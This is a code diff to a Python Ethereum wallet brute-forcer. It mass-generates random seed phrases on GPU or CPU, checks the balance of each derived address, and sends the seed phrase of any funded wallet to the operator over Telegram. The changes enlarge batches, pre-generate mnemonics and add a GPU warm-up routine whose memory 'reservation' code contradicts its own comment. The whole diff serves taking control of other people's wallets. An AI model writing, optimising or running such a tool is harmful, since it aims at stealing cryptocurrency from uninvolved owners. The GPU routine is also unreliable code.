@@ -50,64 +50,91 @@ def worker_process(worker_id: int, word_list: List[str], counter: SharedCounter,
         ethereum = EthereumService()
         telegram = TelegramService()
         
-        # Use larger batch size for GPU
-        BATCH_SIZE = 200 if device == "cuda" else 50
+        # Optimize batch size based on available GPU memory
+        if device == "cuda":
+            total_memory = torch.cuda.get_device_properties(0).total_memory
+            # Use larger batches for GPUs with more memory
+            BATCH_SIZE = min(1000, max(200, int(total_memory / (1024 * 1024 * 1024) * 100)))
+        else:
+            BATCH_SIZE = 50
+            
         start_time = time.time()
         local_checked = 0
         
-        # Pre-compile device specific components
+        # Pre-generate some mnemonics to avoid initial delay
+        initial_mnemonics = []
+        print(f"{Fore.YELLOW}Worker {worker_id} preparing initial batch...{Style.RESET_ALL}")
+        
+        # Generate initial batch of mnemonics
         if device == "cuda":
-            torch.cuda.init()
+            initial_mnemonics = ethereum.generate_random_mnemonics_gpu(word_list, BATCH_SIZE * 2)
+        else:
+            initial_mnemonics = [ethereum.generate_random_mnemonic(word_list) for _ in range(BATCH_SIZE)]
+        
+        print(f"{Fore.GREEN}Worker {worker_id} ready with {len(initial_mnemonics)} initial mnemonics{Style.RESET_ALL}")
         
         while True:
             try:
-                # Generate mnemonics in batches
-                if device == "cuda":
-                    # Use GPU for parallel mnemonic generation
-                    mnemonics = ethereum.generate_random_mnemonics_gpu(
-                        word_list, BATCH_SIZE
-                    )
+                # Use pre-generated mnemonics or generate new ones
+                if initial_mnemonics:
+                    mnemonics = initial_mnemonics[:BATCH_SIZE]
+                    initial_mnemonics = initial_mnemonics[BATCH_SIZE:]
                 else:
-                    # CPU-based generation
-                    mnemonics = [
-                        ethereum.generate_random_mnemonic(word_list)
-                        for _ in range(BATCH_SIZE)
-                    ]
+                    if device == "cuda":
+                        mnemonics = ethereum.generate_random_mnemonics_gpu(word_list, BATCH_SIZE)
+                    else:
+                        mnemonics = [ethereum.generate_random_mnemonic(word_list) for _ in range(BATCH_SIZE)]
+                
+                if not mnemonics:
+                    print(f"{Fore.RED}Worker {worker_id} failed to generate mnemonics, retrying...{Style.RESET_ALL}")
+                    continue
                 
                 # Check wallets in parallel
                 results = ethereum.check_wallets_batch(mnemonics)
                 
                 # Process results
+                valid_checks = 0
                 for mnemonic, (address, balance) in zip(mnemonics, results):
-                    if address and balance > 0:
-                        message = (
-                            f"[+] Found wallet with balance!\n"
-                            f"Mnemonic: {mnemonic}\n"
-                            f"Balance: {balance} ETH\n"
-                            f"Address: {address}"
+                    if address:
+                        valid_checks += 1
+                        if balance > 0:
+                            message = (
+                                f"[+] Found wallet with balance!\n"
+                                f"Mnemonic: {mnemonic}\n"
+                                f"Balance: {balance} ETH\n"
+                                f"Address: {address}"
+                            )
+                            telegram.send_message(message)
+                            return
+                
+                # Update counters with actual valid checks
+                if valid_checks > 0:
+                    local_checked += valid_checks
+                    total_checked = counter.increment(valid_checks)
+                    
+                    # Calculate and display performance metrics
+                    if local_checked % 1000 == 0:
+                        elapsed_time = time.time() - start_time
+                        wallets_per_second = local_checked / elapsed_time
+                        status = (
+                            f"{Fore.CYAN}Worker {worker_id:<2}{Style.RESET_ALL} | "
+                            f"Speed: {format_number(wallets_per_second)} w/s | "
+                            f"Valid: {valid_checks}/{BATCH_SIZE} | "
+                            f"Total: {Fore.BLUE}{total_checked:,}{Style.RESET_ALL}"
                         )
-                        telegram.send_message(message)
-                        return
+                        print(status)
                 
-                # Update counters
-                local_checked += BATCH_SIZE
-                total_checked = counter.increment(BATCH_SIZE)
-                
-                # Calculate and display performance metrics
-                if local_checked % 1000 == 0:
-                    elapsed_time = time.time() - start_time
-                    wallets_per_second = local_checked / elapsed_time
-                    status = (
-                        f"{Fore.CYAN}Worker {worker_id:<2}{Style.RESET_ALL} | "
-                        f"Speed: {format_number(wallets_per_second)} w/s | "
-                        f"Checked: {Fore.BLUE}{total_checked:,}{Style.RESET_ALL}"
+                # Generate next batch in background while checking current batch
+                if device == "cuda" and len(initial_mnemonics) < BATCH_SIZE:
+                    initial_mnemonics.extend(
+                        ethereum.generate_random_mnemonics_gpu(word_list, BATCH_SIZE)
                     )
-                    print(status)
                     
             except KeyboardInterrupt:
                 break
             except Exception as e:
                 print(f"{Fore.RED}Worker {worker_id} error: {e}{Style.RESET_ALL}")
+                time.sleep(1)  # Prevent rapid error loops
                 continue
                 
     except Exception as e:
@@ -129,6 +156,37 @@ class WalletChecker:
         # Setup system
         self.device = self.system.check_gpu_availability()
         self.worker_count = self.system.get_optimal_worker_count()
+        
+        if self.device.type == "cuda":
+            # Pre-allocate GPU memory
+            self._prepare_gpu()
+            
+    def _prepare_gpu(self):
+        """Prepare GPU for optimal performance."""
+        try:
+            # Set optimal GPU memory allocation
+            torch.cuda.empty_cache()
+            
+            # Reserve GPU memory
+            memory_pool = []
+            try:
+                while True:
+                    memory_pool.append(torch.empty(256, 256, device="cuda"))
+            except Exception:
+                pass
+            
+            # Clear the pool but maintain the memory allocation
+            del memory_pool
+            torch.cuda.empty_cache()
+            
+            # Warm up CUDA kernels
+            for _ in range(3):
+                dummy_tensor = torch.randn(1000, 1000, device="cuda")
+                torch.matmul(dummy_tensor, dummy_tensor.t())
+            torch.cuda.synchronize()
+            
+        except Exception as e:
+            print(f"GPU preparation error (non-critical): {e}")
 
     def start(self):
         """Start the wallet checking processes."""
